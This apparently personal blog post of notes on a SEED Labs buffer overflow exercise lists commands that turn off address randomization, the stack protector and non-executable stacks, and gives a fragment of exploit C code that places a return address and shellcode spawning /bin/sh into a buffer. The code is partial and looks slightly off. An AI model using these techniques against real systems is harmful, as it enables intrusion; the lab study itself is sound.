---
layout: post
title: "Buffer Overflow Attack"
categories:
  - Seed Labs
tags:
  - security
  - C
---

address space randomization
to turn it off:
* $ sudo sysctl -w kernel.randomize_va_space=0

Stack gaurd protection
to turn it off:
* $ gcc -fno-stack-protector

To make the stack be able to execute commands:
* $ gcc -z execstack

The shellcode invokes the
execve()
system call to execute
/bin/sh

if buffer size is 24
You need to fill the buffer with appropriate contents here */
    buffer[36] = 0xDC;
    buffer[37] = 0xEB;
    buffer[38] = 0xFF;
    buffer[39] = 0xBF;

    int i;
    int j = 0;
    int len = 512 - (sizeof(shellcode) / sizeof(shellcode[0]));
    printf("%d", len);
    for(i = len; i <= 512; i++){
        buffer[i] = shellcode[j];
        j++;
    }

if the buffer is 28 then i need to add 4 bytes to the buffer -> buffer[40]
